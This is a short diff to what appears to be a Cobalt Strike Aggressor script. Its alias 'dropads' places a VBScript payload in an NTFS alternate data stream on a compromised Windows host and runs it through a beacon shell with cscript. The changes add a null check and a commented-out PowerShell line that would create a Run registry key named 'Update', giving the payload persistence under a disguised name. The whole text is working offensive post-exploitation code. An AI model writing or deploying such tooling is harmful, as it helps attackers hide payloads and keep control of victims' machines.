@@ -59,6 +59,9 @@ alias dropads {
 
 	$user = binfo($1,"user");
 	$temphome = %bvars[$1]["TEMP"];
+
+	if($temphome = null) { return };
+
 	$windir = %bvars[$1]["windir"];
 
 	$filename = randomString(7);
@@ -78,7 +81,10 @@ alias dropads {
 	#bupload_raw($1,$filename,$vbscript);
 
 	bshell($1,"cmd /c $windir\\system32\\cscript.exe //E:vbscript $ads");
+	#bpowershell($1,"new-itemproperty -Path \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" -Name Update -PropertyType String -Value \"$windir\system32\cscript.exe //E:vbscript $ads\" -Force");
+
 
 	#Question how do i delete the ads ??
+
 
 }
